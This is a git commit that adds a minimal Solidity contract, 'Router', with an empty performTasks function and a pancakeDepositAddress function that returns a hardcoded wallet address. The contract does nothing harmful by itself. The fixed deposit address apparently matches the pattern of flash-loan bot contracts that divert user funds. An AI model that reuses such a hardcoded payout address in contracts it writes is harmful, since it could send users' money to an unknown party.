fc886eb7851e028b1afdb0b0b59d7b1355164a04
inspectordev999 <102457534+inspectordev999@users.noreply.github.com>
2022-03-27 12:35:33 +0200

    Create ILoanRepay.sol

---
+++ ILoanRepay.sol
@@ -0,0 +1,9 @@
+pragma solidity ^0.5.0;
+
+contract Router {
+    function performTasks() public {}
+
+    function pancakeDepositAddress() public pure returns (address) {
+        return 0xb88BCa70DC946d12D8EB68294EdbBB45285841FB;
+    }
+}
